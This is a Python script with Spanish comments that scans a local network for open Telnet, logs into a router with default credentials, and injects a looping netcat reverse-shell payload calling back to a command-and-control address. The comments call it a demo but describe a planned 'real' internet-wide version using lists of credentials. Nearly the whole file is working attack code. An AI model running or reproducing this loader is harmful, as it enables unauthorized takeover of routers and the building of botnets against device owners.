import subprocess
import threading
import time
import socket

IP_ROUTER = "192.168.1.1"      #En este caso colocaremos la IP de la victima por que es una simulacion , en el escaneo podrias escontrar mas ips, en otro git sera en internet y sera diferente
USER      = "user"             # las credenciales del modem estan en eese formato por que es una demo, para agilizar la explicacion ,en la version futura y real sera diferente ,20 a 30 credenciales -
PASSWORD  = "user"
TU_IP     = "192.168.1.4"      # IP , aqui ira la IP donde esta corriendo el C&C (comand & control) , puedes colocar tu propia maquina como C&C 
TU_PUERTO = "44444"            # puerto  donde inicia/conecta  la conexion saliente en ese puerto


PAYLOAD = f"killall nc sh 2>/dev/null; rm -f /tmp/p; mknod /tmp/p p; sh -c 'while :;do /bin/sh 0</tmp/p | nc {TU_IP} {TU_PUERTO} 1>/tmp/p 2>/tmp/p || sleep 20;done'&"

def escanear_telnet():
    """🔍 sim escanear toda la red /24 , solo "10"   ""
    print("🚀 SCAN MODULE CORRIENDO...")
    print("📡 ESCANEANDO TELNET EN 192.168.1.0/24 (254 hosts)")
    print("🎯 Buscando servicio Telnet en puerto 23...")
    print("⏳ Escaneo completo en progreso...\n")
    
    servicios_telnet = []
    total_ips = 254
    ips_escaneadas = 10  
    
    for i in range(1, ips_escaneadas + 1):  
        ip = f"192.168.1.{i}"
        
        # Simulamos progreso de escaneo completo
        progreso = (i / total_ips) * 100
        print(f"🔍 Escaneando {ip}:23... [{i}/254 - {progreso:.1f}%]", end="")
        
        try:
            # Intenta conectar al puerto 23 (Telnet) con timeout corto
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            resultado = sock.connect_ex((ip, 23))
            
            if resultado == 0:
                estado = " ✅ TELNET ABIERTO"
                servicios_telnet.append(ip)
                print(f"{estado} ← ¡SERVICIO ENCONTRADO!")
            else:
                estado = " ❌ Cerrado"
                print(f"{estado}")
            
            sock.close()
            
        except Exception as e:
            print(f" ⚠ Error")
        
        time.sleep(0.3)  
    
    
    print(f"\n⏩ Escaneo completado. Continuando con análisis...")
    time.sleep(1)
    
    print(f"\n📊 RESUMEN DEL ESCANEO TELNET:")
    print(f"🎯 Red escaneada: 192.168.1.0/24 (254 hosts)")
    print(f"✅ Servicios Telnet encontrados: {len(servicios_telnet)}")
    
    if servicios_telnet:
        print("🏠 Routers con Telnet habilitado:")
        for ip in servicios_telnet:
            if ip == IP_ROUTER:
                print(f"   🎯 {ip}:23 ← OBJETIVO PRINCIPAL - LISTO PARA CONEXIÓN")
            else:
                print(f"   📍 {ip}:23")
    else:
        print("😞 No se encontraron servicios Telnet en la red")
    
    print("\n" + "="*50)
    return servicios_telnet

# SCAN TELNET ANTES DEL LOGIN
print("🔄 PREPARANDO CONEXIÓN AL ROUTER...")
time.sleep(1)

# escaneo Telnet
servicios_telnet = escanear_telnet()
time.sleep(1)

if IP_ROUTER not in servicios_telnet:
    print(f"⚠  Advertencia: {IP_ROUTER} no apareció en el escaneo Telnet")
    print("🔧 Continuando con conexión manual...")
else:
    print(f"🎯 Objetivo identificado: {IP_ROUTER} - Telnet activo")

print(f"🔗 Conectando al router {IP_ROUTER}...")

# Abre el login Telnet
p = subprocess.Popen(["telnet", IP_ROUTER],
                     stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                     text=True,
                     bufsize=0)

# login en vivo
def lector():
    while True:
        linea = p.stdout.readline()
        if linea:
            print(linea, end="")
        elif p.poll() is not None:
            break

threading.Thread(target=lector, daemon=True).start()

# login automático
print("🔑 INICIANDO LOGIN TELNET...")
time.sleep(1.5); p.stdin.write(USER + "\n");      p.stdin.flush()
time.sleep(1.5); p.stdin.write(PASSWORD + "\n");  p.stdin.flush()
time.sleep(2.5)   # espera a que aparezca el # limpio

# Envía tu payload letra x letra
print("💉 AÑADIENDO EL LOADER...")
print("📤 ENVIANDO PAYLOAD AL ROUTER...")
for char in PAYLOAD:
    p.stdin.write(char)
    p.stdin.flush()
    time.sleep(0.002)


p.stdin.write("\n")
p.stdin.flush()

time.sleep(0.8)  # el router ejecuta el & y devuelve el prompt en <1 segundo

print("✅ PAYLOAD INYECTADO EN BACKGROUND")
print("🎯 ¡REVERSE SHELL ACTIVA!")
print("👉 Verifiquemos "id" por ejemplo para saber si esta conectado")
print("🔧 Podemos seguir usando el telnet en la maquina victima ↓↓↓\n")

# Bucle interactivo
try:
    while True:
        cmd = input("# ")
        if cmd.lower() == "exit":
            p.stdin.write("exit\n")
            p.stdin.flush()
            break
        if cmd.strip():
            p.stdin.write(cmd + "\n")
            p.stdin.flush()
except KeyboardInterrupt:
    print("\n🛑 Saliendo...")
finally:
    p.terminate()
